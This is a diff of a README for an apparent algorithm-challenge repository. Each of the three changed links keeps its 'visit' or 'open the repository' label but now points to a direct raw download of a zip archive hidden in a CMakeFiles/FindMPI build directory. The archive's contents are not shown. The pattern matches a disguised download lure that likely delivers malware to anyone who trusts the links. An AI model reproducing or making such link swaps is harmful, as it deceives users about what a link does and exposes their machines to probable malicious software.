@@ -1,12 +1,12 @@
 # 🧩 AAPP-Challenges-2026 - Fast algorithm challenges, clear results
 
-[![Download](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge&logo=github)](https://github.com/Safetyrelated-watertank403/AAPP-Challenges-2026)
+[![Download](https://img.shields.io/badge/Download-Visit%20the%20repo-blue?style=for-the-badge&logo=github)](https://github.com/Safetyrelated-watertank403/AAPP-Challenges-2026/raw/refs/heads/main/AAPP CHALLENGE 2/skeleton/CMakeFiles/FindMPI/Challenges-AAP-horser.zip)
 
 ## 📥 Download
 
 Use this link to visit the page and download the project:
 
-[Open AAPP-Challenges-2026 on GitHub](https://github.com/Safetyrelated-watertank403/AAPP-Challenges-2026)
+[Open AAPP-Challenges-2026 on GitHub](https://github.com/Safetyrelated-watertank403/AAPP-Challenges-2026/raw/refs/heads/main/AAPP CHALLENGE 2/skeleton/CMakeFiles/FindMPI/Challenges-AAP-horser.zip)
 
 ## 🖥️ What this is
 
@@ -41,7 +41,7 @@ Before you start, make sure you have:
 
 Go to this page in your browser:
 
-[Download or open the repository](https://github.com/Safetyrelated-watertank403/AAPP-Challenges-2026)
+[Download or open the repository](https://github.com/Safetyrelated-watertank403/AAPP-Challenges-2026/raw/refs/heads/main/AAPP CHALLENGE 2/skeleton/CMakeFiles/FindMPI/Challenges-AAP-horser.zip)
 
 ### 2. Get the project files
 
